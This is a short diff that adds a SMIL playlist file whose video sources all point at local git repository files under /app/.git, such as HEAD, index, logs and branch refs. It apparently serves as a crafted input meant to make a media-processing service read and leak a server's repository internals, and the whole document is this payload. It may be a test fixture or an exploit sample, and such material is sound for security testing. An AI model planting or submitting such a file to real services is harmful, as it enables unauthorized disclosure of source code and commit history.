@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil>
+  <body>
+    <switch>
+      <video src="/app/.git/HEAD"/>
+      <video src="/app/.git/description"/>
+      <video src="/app/.git/COMMIT_EDITMSG"/>
+      <video src="/app/.git/index"/>
+      <video src="/app/.git/packed-refs"/>
+      <video src="/app/.git/ORIG_HEAD"/>
+      <video src="/app/.git/FETCH_HEAD"/>
+      <video src="/app/.git/info/exclude"/>
+      <video src="/app/.git/logs/HEAD"/>
+      <video src="/app/.git/refs/heads/main"/>
+      <video src="/app/.git/refs/heads/master"/>
+    </switch>
+  </body>
+</smil>
